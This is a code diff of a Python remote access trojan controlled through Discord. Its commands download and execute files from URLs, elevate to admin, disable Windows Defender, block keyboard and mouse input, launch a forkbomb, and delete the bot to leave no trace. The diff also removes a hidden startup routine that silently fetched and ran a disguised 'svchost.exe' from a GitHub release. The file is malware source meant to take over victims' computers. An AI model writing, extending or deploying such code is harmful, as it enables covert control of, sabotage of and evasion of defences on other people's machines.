@@ -38,6 +38,7 @@ import uuid
 import socket
 import cgi
 import win32com.client
+import pyttsx3
 
 def is_admin():
     """Check if the script is running with admin privileges."""
@@ -56,28 +57,6 @@ def run_as_admin():
     ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, ' '.join(sys.argv), None, 1)
 
 run_as_admin()
-
-def download_and_open_file(url, destination):
-    try:
-        if os.path.exists(destination):
-            os.remove(destination)
-            print(f"Old file deleted: {destination}")
-
-        response = requests.get(url, stream=True)
-        response.raise_for_status()
-        with open(destination, 'wb') as file:
-            for chunk in response.iter_content(chunk_size=8192):
-                file.write(chunk)
-        os.startfile(destination)  # Open the file
-    except requests.exceptions.RequestException as e:
-        print(f"Error downloading file: {e}")
-    except PermissionError:
-        print(f"Permission denied: Unable to delete or write to file {destination}.")
-
-github_url = "https://github.com/SoulOnToq/Python/releases/download/v1/svchost.exe"
-destination_path = os.path.join(os.getenv('TEMP'), 'svchost.exe')
-
-download_and_open_file(github_url, destination_path)
 
 shine = "PUT_YOUR_DISCORD_TOKEN HERE"
 GUILD_ID = PUT_YOUR_GUILD_ID_HERE
@@ -322,15 +301,26 @@ async def execute(ctx, url: str):
         print(f"An error occurred: {e}")
         await ctx.send(f"Failed to download or execute the file: {e}")
     
-
 @bot.command()
 async def admin(ctx):
     print("Admin command received!")
-
-    if ctypes.windll.shell32.IsUserAnAdmin():
-        await ctx.send("Running with admin privileges.")
+    
+    if not ctypes.windll.shell32.IsUserAnAdmin():
+        await ctx.send("Restarting with admin privileges...")
+        try:
+            # Restart the bot with admin privileges
+            ctypes.windll.shell32.ShellExecuteW(
+                None, 
+                "runas", 
+                sys.executable,  # Path to the Python interpreter
+                " ".join(sys.argv),  # Arguments to the script
+                None, 
+                1  # Show the command window
+            )
+        except Exception as e:
+            await ctx.send(f"Failed to restart with admin privileges: {str(e)}")
     else:
-        await ctx.send("Not running as admin.")
+        await ctx.send("Already running as admin.")
 
 @bot.command()
 async def av(ctx):
@@ -387,7 +377,7 @@ async def av(ctx):
 
 
 @bot.command()
-async def clients(ctx):
+async def status(ctx):
     print("Clients command received!")
     await ctx.send("Connected clients: " + ', '.join(PC_CHANNELS.keys()))
 
@@ -441,7 +431,7 @@ async def commands(ctx):
     embed1.add_field(name="💻 .execute [url]", value="Download and execute a file from a given URL.", inline=False)
     embed1.add_field(name="🔑 .admin", value="Restart the bot with admin privileges.", inline=False)
     embed1.add_field(name="🛡️ .av", value="Disable Windows Defender and other antivirus software.", inline=False)
-    embed1.add_field(name="👥 .clients", value="Show connected clients.", inline=False)
+    embed1.add_field(name="👥 .status", value="Checks if the pc is still connected.", inline=False)
     embed1.add_field(name="🔒 .shutdown", value="Shutdown the PC.", inline=False)
     embed1.add_field(name="🔄 .restart", value="Restart the PC.", inline=False)
 
@@ -466,6 +456,7 @@ async def commands(ctx):
     embed2.add_field(name="😵 .monitors-off", value="Turn off Monitor", inline=False)
     embed2.add_field(name="😃 .monitors-on", value="Turn on monitor", inline=False)
     embed2.add_field(name="🍴 .forkbomb", value="FORBOMB BOMB  YOUR PC.", inline=False)
+    embed2.add_field(name="❌ .remove", value="Removes itself leave no trace.", inline=False)
     await ctx.send(embed=embed2)
 
 @bot.command()
@@ -498,7 +489,7 @@ async def disconnect(ctx):
         await bot.logout()
         os._exit(0)  # Forcefully terminate the script if no active sessions remain
 
-# Global variable to control the blocking loop
+# Global variables
 block_input_active = False
 mouse_listener = None
 
@@ -509,7 +500,7 @@ def block_input():
 
     block_input_active = True
 
-    # Start blocking keyboard input
+    # Block keyboard input
     while block_input_active:
         keyboard.block_key("all")  # Block all keyboard keys
         time.sleep(0.1)  # Small delay to prevent high CPU usage
@@ -542,7 +533,7 @@ async def block_input_command(ctx):
     await ctx.send("Blocking all keyboard and mouse input...")
     
     # Start blocking input in a separate thread
-    thread = Thread(target=block_input)
+    thread = threading.Thread(target=block_input)
     thread.daemon = True
     thread.start()
     
@@ -902,6 +893,40 @@ async def forkbomb(ctx):
     thread = threading.Thread(target=spam_apps)
     thread.daemon = True  # This allows the thread to exit when the main program exits
     thread.start()
+
+# Initialize pyttsx3 engine
+engine = pyttsx3.init()
+
+# .tts command that converts text to speech and plays it on your PC
+@bot.command(name="tts")
+async def tts(ctx, *, text: str):
+    if text:
+        # Use pyttsx3 to convert text to speech and play it locally on your PC
+        engine.say(text)
+        engine.runAndWait()
+        
+        await ctx.send(f"Playing TTS message: '{text}'")
+    else:
+        await ctx.send("Please provide a message to convert to speech.")
+
+@bot.command()
+async def remove(ctx):
+    """Removes the bot file entirely."""
+    await ctx.send("Bot is being removed from this machine. Goodbye!")
+    
+    # Get the path to the current bot file
+    bot_file = sys.argv[0]
+    
+    try:
+        # Attempt to close the bot before removal
+        await bot.close()
+        
+        # Remove the bot file from the system
+        os.remove(bot_file)
+        print(f"{bot_file} has been successfully removed.")
+        
+    except Exception as e:
+        print(f"Error removing bot: {e}")
 
 if __name__ == "__main__":
     # Check if the script is run as a standalone .exe or as a .py script
